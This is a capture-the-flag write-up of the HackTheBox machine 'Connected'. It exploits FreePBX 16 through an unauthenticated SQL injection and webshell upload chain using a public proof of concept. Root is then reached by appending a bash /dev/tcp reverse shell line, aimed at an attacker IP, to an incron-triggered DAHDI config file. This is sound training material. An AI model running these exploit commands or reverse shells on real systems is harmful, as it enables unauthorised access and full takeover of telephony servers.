---
layout: post
title: "Connected (Retired Box)"
date: 2026-06-13 10:00:00 +01:00
categories: ["HackTheBox", "htb-boxes"]
tags:
  - FreePBX
  - CVE-2025-57819
  - CVE-2025-61678
  - SQLi
  - incron
  - DAHDI
  - config-injection
image: /assets/img/posts/htb-boxes/connected/connected.png
permalink: /connected/
redirect_from:
  - /posts/Connected/
draft: false
excerpt: "Connected is an Easy Linux box running FreePBX 16.0.40.7, exploited via a two-CVE unauthenticated chain that drops a webshell, with privilege escalation through an incron-triggered DAHDI config injection to land a root shell."
locked: true
password_hash: 281d2104c5d4d4fe0c477f46a7f7b9b422ae962b1f919dbf1af2ee7777fbfec6
---

## Box Info

| Field      | Details                        |
|------------|--------------------------------|
| Name       | [Connected](https://www.hackthebox.com/machines/connected)                      |
| OS         | Linux (CentOS 7)               |
| Difficulty | Easy                           |
| Release    | 2026-06-13                     |
| Retired         | TBD                   |

---

## Overview

Connected runs a telephony PBX stack with a CVE chain and a misconfigured service management layer underneath. The attack chain is two phases: an unauthenticated SQLi (CVE-2025-57819) creates a rogue admin account in the FreePBX database, and a path traversal in the Endpoint Manager firmware upload (CVE-2025-61678) drops a PHP webshell into a random directory on the web root. From there I'll land a shell as `asterisk`, grab the user flag, and escalate to root by injecting a reverse shell payload into a file writable by `asterisk` that gets sourced as root whenever incrond fires off a DAHDI restart event.

---

## Recon

### Initial Scanning

`nmap` finds three open TCP ports — 22, 80, and 443:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ sudo nmap -p 22,80,443 -sCV -oN nmap/connected.txt 10.129.25.56
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-13 10:57 WAT
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-robots.txt: 1 disallowed entry
|_/
| http-title: 404 Not Found
|_Requested resource was config.php
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization
[snip]
```

OpenSSH 7.4 and Apache 2.4.6 both place this firmly on CentOS 7. The redirect to `connected.htb` on port 80 means I need a hosts entry.

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ echo "10.129.25.56 connected.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### TCP 443 — FreePBX

Browsing to `http://connected.htb` serves the FreePBX landing page directly, with four panels: FreePBX Administration, User Control Panel, Operator Panel, and Get Support. The footer gives me the exact version: **FreePBX 16.0.40.7**.

![FreePBX landing page](/assets/img/posts/htb-boxes/connected/freepbx-landing.png)

A quick `searchsploit freepbx 16` surfaces `php/webapps/52031.php` — an authenticated RCE via the API module.

![Searchsploit FreePBX](/assets/img/posts/htb-boxes/connected/searchsploit.png)

But there’s something better available: **CVE-2025-57819 + CVE-2025-61678**, a public unauthenticated chain targeting FreePBX 16.0.40.7 exactly.

---

## Foothold

### CVE-2025-57819 + CVE-2025-61678 — Unauthenticated RCE Chain

The exploit chain is two linked CVEs:

- **CVE-2025-57819** — Stacked SQL injection via the `brand` parameter in the FreePBX admin AJAX endpoint. No authentication required. The injection inserts a fully privileged admin row directly into the `ampusers` table.
- **CVE-2025-61678** — The Endpoint Manager firmware upload handler accepts a `fwbrand` parameter with no path sanitisation. The exploit uses this to write a PHP webshell to an arbitrary directory under the web root.

I'll use the public PoC from [0xEhab on GitHub](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE):

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ cd FreePBX-CVE-2025-57819-RCE
```

First, a quick sanity check with `--command "id"` to confirm the chain works before going for the shell:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ python3 exploit.py --rhost 10.129.25.56 --command "id"
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_zmc97:0zz286rji5x4
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_zmc97
[*] [CVE-2025-61678] uploading webshell -> /h1qn0e3l17/gtxodh4t.php
[+] webshell live: https://10.129.25.56/h1qn0e3l17/gtxodh4t.php
[*] executing: id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

The SQLi created a rogue admin, authenticated to the panel, uploaded the webshell via the firmware endpoint, and executed `id` — all in one shot. Now I'll catch a reverse shell:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ rlwrap -cAr nc -lnvp 9001
```

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ python3 exploit.py --rhost 10.129.25.56 --lhost 10.10.16.35 --lport 9001
[snip]
[*] firing reverse shell -> 10.10.16.35:9001
[*] payload sent, check your listener
```

```
connect to [10.10.16.35] from (UNKNOWN) [10.129.25.56] 54044
[asterisk@connected qk6w35zxmh]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

Shell landed as `asterisk`.

![Reverse shell as asterisk](/assets/img/posts/htb-boxes/connected/foothold.png)

---

## User Flag

The user flag lives in the `asterisk` home directory, which makes sense given the service account maps directly to the running user:

```bash
[asterisk@connected ~]$ cat /home/asterisk/user.txt
```

---

## Privilege Escalation

### Enumeration

The first thing I check after landing a shell is `sudo -l`, but without a valid pass, I can't get anywhere with that. I move to the enumerate further.

```bash
[asterisk@connected ~]$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/incrontab
/usr/bin/at
[snip]
```

`/usr/bin/pkexec` initially looked promising but a quick version check kills that idea:

```bash
[asterisk@connected ~]$ rpm -qa polkit
polkit-0.112-26.el7_9.1.x86_64
```

The `.el7_9.1` suffix means this is the patched build. PwnKit is off the table.

`/usr/bin/incrontab` is more interesting — it's the user-facing tool for `incrond`, an inotify-based scheduler that fires commands when filesystem events occur rather than on a time schedule. It's less common than cron and easy to overlook, but its presence here is a strong signal. If incrond is running as root and watching paths that `asterisk` can write to, there's a privesc in there somewhere.

Checking the process list confirms incrond is live:

```bash
[asterisk@connected ~]$ ps aux | grep root | grep -v "\["
root   749  /usr/sbin/incrond
root  1267  /bin/sh /usr/sbin/safe_asterisk
root  1189  /usr/sbin/httpd -DFOREGROUND
[snip]
```

Two processes worth dwelling on. `/usr/sbin/safe_asterisk` is the watchdog script that restarts the Asterisk PBX daemon if it crashes — it runs as root and sources scripts from `/etc/asterisk/startup.d/` on each restart cycle. I read through that script carefully looking for a writable injection point, but it implements an ownership check: if the `startup.d` directory exists and isn't owned by root, the script exits with a fatal error. Since we own that directory as `asterisk`, we can't pass the check.

That leaves incrond. The system-level incron tables live in `/etc/incron.d/`, and reading them reveals exactly what's being watched:

```bash
[asterisk@connected ~]$ ps aux | grep root | grep -v "\["
root   749  /usr/sbin/incrond
root  1267  /bin/sh /usr/sbin/safe_asterisk
[snip]
```

Checking the system incron tables in `/etc/incron.d/` reveals the attack surface:

```bash
[asterisk@connected ~]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
[snip]
```

Reading `/usr/sbin/sysadmin_dahdi_restart` completes the picture:

```bash
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
[snip]
```

The chain is:

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
  → incrond (root) fires sysadmin_dahdi_restart
    → /etc/init.d/dahdi restart (root)
      → sources /etc/dahdi/init.conf
        → our payload runs as root
```

The final piece: `/etc/dahdi/init.conf` is owned by `asterisk` and writable by us.

```bash
[asterisk@connected ~]$ ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 824 Jun 13 12:38 /etc/dahdi/init.conf
```

### DAHDI init.conf Injection

I'll inject a reverse shell payload into `init.conf`, set up a listener, then `touch` the trigger file to kick off the chain:

```bash
[asterisk@connected ~]$ echo 'bash -i >& /dev/tcp/10.10.16.35/9002 0>&1' >> /etc/dahdi/init.conf
```

On Kali, second listener ready:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/Connected]
└─$ rlwrap -cAr nc -lnvp 9002
```

Trigger the incron rule:

```bash
[asterisk@connected ~]$ touch /var/spool/asterisk/sysadmin/dahdi_restart
```
---

## Root Flag

Root shell caught.

![Root shell](/assets/img/posts/htb-boxes/connected/root.png)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port sweep and service/version detection |
| CVE-2025-57819 PoC | Stacked SQLi to create rogue FreePBX admin |
| CVE-2025-61678 PoC | Firmware upload path traversal to drop webshell |
| netcat (rlwrap) | Reverse shell listener |
| incron | Inotify-based task scheduler abused for privesc trigger |

---

## Key Takeaways

- **Version numbers matter:** The FreePBX version in the footer (`16.0.40.7`) was the entire foothold. No directory brute-force needed — the version fingerprint pointed straight to a working unauthenticated CVE chain.
- **Inotify-based schedulers are underenumerated:** Most checklists cover cron and systemd timers. `incrond` watches filesystem events rather than time — a fundamentally different trigger model that tools like `linpeas` can miss if you're not reading process output carefully.
- **Config file injection is often more reliable than binary exploitation:** The privesc here required zero exploit code. Writing two lines to a config file and touching a trigger file was enough. Permissions on service-owned config files are worth checking on any box running a complex application stack.
- **Touch vs write matters with IN_CLOSE_WRITE:** The incron rule fires on `IN_CLOSE_WRITE`, which requires a proper open/write/close sequence. `touch` on the trigger file generates the right event. Simple shell redirects from inside a reverse shell can behave differently depending on how the shell manages file descriptors.

---

## Further Reading

**CVEs & Exploits**

| Reference | Description |
|-----------|-------------|
| [CVE-2025-57819](https://nvd.nist.gov/vuln/detail/CVE-2025-57819) | FreePBX 16 unauthenticated stacked SQLi via brand parameter — inserts arbitrary admin rows into ampusers |
| [CVE-2025-61678](https://nvd.nist.gov/vuln/detail/CVE-2025-61678) | FreePBX 16 Endpoint Manager firmware upload path traversal — writes arbitrary PHP to web root |
| [CVE-2026-23741](https://www.sentinelone.com/vulnerability-database/cve-2026-23741/) | Asterisk 20.x ast_coredumper sources attacker-controlled config before root check |

**Tools & Techniques**

| Resource | Description |
|----------|-------------|
| [0xEhab FreePBX RCE PoC](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE) | Public exploit chain combining CVE-2025-57819 and CVE-2025-61678 |
| [HackTricks — Incron Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) | Linux privesc techniques including inotify-based scheduler abuse |
| [incrond man page](https://linux.die.net/man/8/incrond) | Reference for incron event types including IN_CLOSE_WRITE behaviour |
| [GTFOBins — asterisk](https://gtfobins.github.io/gtfobins/asterisk/) | Shell escape from the Asterisk CLI using the ! prefix |
